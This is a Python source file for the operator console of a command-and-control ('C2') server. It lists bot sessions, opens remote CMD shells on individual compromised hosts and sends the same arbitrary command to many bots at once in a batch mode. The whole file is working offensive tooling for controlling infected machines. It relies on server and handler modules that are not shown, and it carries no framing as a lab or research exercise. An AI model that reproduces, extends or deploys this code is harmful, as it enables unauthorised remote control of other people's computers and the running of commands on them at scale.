# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

# Project imports
import handler
import server
# from handler import Handler
# from server import batchList, aliveConnections, deadConnections, clientAddressList

class Interpreter(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        #self.q = qv2                        # Queue used for issuing commands

    def run(self):

        while True:

            # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
            
            cmd = str(input("[TU-C2:CONSOLE]$ ")).casefold()

            # TODO:
            # commands:
            #   - list-mods
            #   - info <bot-id>
            #   - beacon <bot-id>
            #
            # display:
            #   - usage-info^^^


            if (cmd == ""):
                print("[* Interpreter-Msg] Error: No command received. Try again...")
                pass
            elif (cmd == "exit"):
                self.exit()
            elif (cmd == "clear"):
                self.clearScreen()
            elif (cmd == "list-alive"):
                self.listAlive()
            elif (cmd == "list-dead"):
                self.listDead()
            elif (cmd == "batch-mode"):
                self.batchMode()
            elif (cmd.startswith("interact")):
                try:
                    print(cmd)
                    arg_id = int(cmd.split()[1])
                    print(arg_id)
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                else:
                    try:
                        self.interact(arg_id)
                    except Exception as ex: 
                        print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")
                        print(f"[* Interpreter-Msg] Error: {ex}")
            else:
                print("[* Interpreter-Msg] Unable to process command. Try again...")
                pass
            
                # print(f"[+] Sending Command: {cmd} to {str(len(allConnections))} + " bots")
                # for conn in activeConnections:                                         # for i in range(len(allConnections)):
                #     time.sleep(0.1)
                #     conn.execute(cmd)
#------------------------------------------------------------------------------------------------------------------------------
    def batchMode(self):
 
        self.clearScreen()

        print("[* Interpreter-Msg] Entering Batch-Mode execution.\n")
        print("[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.")
        print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")

        bm_success = False
        bm_entry = ''

        # This loop is super shitty, fix it 
        while ('quit'.casefold() not in bm_entry):
            if(bm_success):
                break
            else:    
                try:
                    bm_entry = input('[* Interpreter-Msg] Enter list of Bot-IDs to interact with (seperated by spaces): ')
                    idlist = [int(n) for n in bm_entry.split()]
                    print(f"[* Interpreter-Msg] ID list obtained: {str(idlist)}")
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to form list of IDs to add to BatchMode-list")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                    bm_success = False
                else:
                    for conn in server.aliveConnections:
                        if conn.getID() in idlist:
                            server.batchList.append(conn)
                    bm_success = True


        time.sleep(1)

        if(bm_success):
            self.clearScreen()
            print("[* Interpreter-Msg] Batch-Mode execution confirmed: ")
            print(f"[* Interpreter-Msg] The commands entered here will be sent to these Bots {idlist}")
            print("[* Interpreter-Msg] Note that this mode will not allow for individual shell environment interaction\n")
            print("[* Interpreter-Msg] Enter Q or QUIT at any time to exit this mode")
            print("[* Interpreter-Msg] Enter EXIT at any time to exit the C2\n\n")

            batch_cmd = ""

            while (True):
                batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                
                if(batch_cmd.casefold() == "quit" or batch_cmd.casefold() == "q"):
                    server.batchList.clear()
                    break
                elif (batch_cmd.casefold() == "exit"):
                    server.batchList.clear()
                    self.exit()
                elif (batch_cmd.casefold() == "shell"):
                    print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
                    print("[* Interpreter-Msg] Please exit if that is the desired result\n")
                    continue
                else:
                    try:
                        print(f"[+] Sending Command: {batch_cmd} to {str(len(server.aliveConnections))} bots")
                        for conn in server.batchList:                                     
                            time.sleep(0.1)
                            print  
                            print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
                            print(conn.execute(batch_cmd))
                    except Exception as ex:
                        print(f"[* Interpreter-Msg] Error with sending command or receiving output: {ex}")
                        print(f"[* Interpreter-Msg] Error: {ex}")

        print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")

# #------------------------------------------------------------------------------------------------------------------------------

#     # Obsolete
#     def activate(self):
#         try:
#             selectedIDs = [int(n) for n in input('[+ Activation] Enter ID list to activate (seperated by spaces): ').split()]
#             print(f"[+ Activation] ID list obtained: {str(selectedIDs)}")
#         except Exception as ex:
#             print(f"[* Interpreter-Msg] Error with activation list: {ex}")
#             print(f"[* Interpreter-Msg] Error: {ex}")
#         else:
#             for conn in allConnections:
#                 #print("Handler: ", str(conn))

#                 if conn.getID() in selectedIDs:
#                     print("Activating Bot " + str(conn.getID()))
#                     conn.activate()
#                     activeConnections.append(conn)
# #------------------------------------------------------------------------------------------------------------------------------

#     # Obsolete  
#     def deactivate(self):
#         try:
#             deselectedIDs = [int(n) for n in input('[- Deactivation] Enter IDs to deactivate (seperated by spaces): ').split()]
#             print(f"[- Deactivation] ID list obtained: {str(deselectedIDs)}")
#         except Exception as ex:
#             print(f"[* Interpreter-Msg] Error with deactivation list: {ex}")
            
#         else:
#             for conn in allConnections:
#                 if conn.getID() in deselectedIDs and conn.isActivated():
#                     print(f"[* Deactivation] Deactivating Bot {str(conn.getID())}")
#                     conn.deactivate()
#                     activeConnections.remove(conn)
#------------------------------------------------------------------------------------------------------------------------------
    def exit(self):
        print(f"[* Interpreter-Msg] Closing connection to {str(len(server.aliveConnections))} bots")
        for conn in server.aliveConnections:                                         
            time.sleep(0.1)
            conn.execute("exit")

        print("[* Interpreter-Msg] Exiting connections for all bots. Please wait...")
        time.sleep(5)
        os._exit(0)
#------------------------------------------------------------------------------------------------------------------------------
    def listAlive(self): # Change to listAlive(self)
        print(".-------------------------.")
        print("| List of Alive Sessions  |")
        print(":--------------------------------.")

        for conn in server.aliveConnections:
            print("| %4d | %16s | %5d |"% (conn.getID(), conn.getIP(), conn.getPort()))
            print(":--------------------------------:")
#------------------------------------------------------------------------------------------------------------------------------
    def listDead(self):
        print(".-------------------------.")
        print("| List of Dead Sessions   |")
        print(":--------------------------------.")

        for session in server.deadConnections:
            print("| %4d | %16s | %5d |"% (session[0], session[1], session[2]))
            print(":--------------------------------:")
#------------------------------------------------------------------------------------------------------------------------------
    # def listAll(self):
    #     print("---------------------------")
    #     print("| List of All Connections |")
    #     print("---------------------------")

    #     for conn in allConnections:
    #         print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
    #         print("---------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def clearScreen(self):
        os.system("clear")
#------------------------------------------------------------------------------------------------------------------------------
    def interact(self, id):
        # print("Shell function entry point")
        print(f"[* Interpreter-Msg] Entering individual interaction with Bot #{id}.\n")
        print("[* Interpreter-Msg] Be mindful that this mode is quite loud.")
        print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")

        shellExecStatus = False
        for conn in server.aliveConnections:
            if conn.getID() == id:
                shellExecStatus = conn.shell()

        if shellExecStatus:
            print("[* Interpreter-Msg] Shell exited graefully...\n")
        else:
            print("[* Interpreter-Msg] Shell exited with errors...\n")

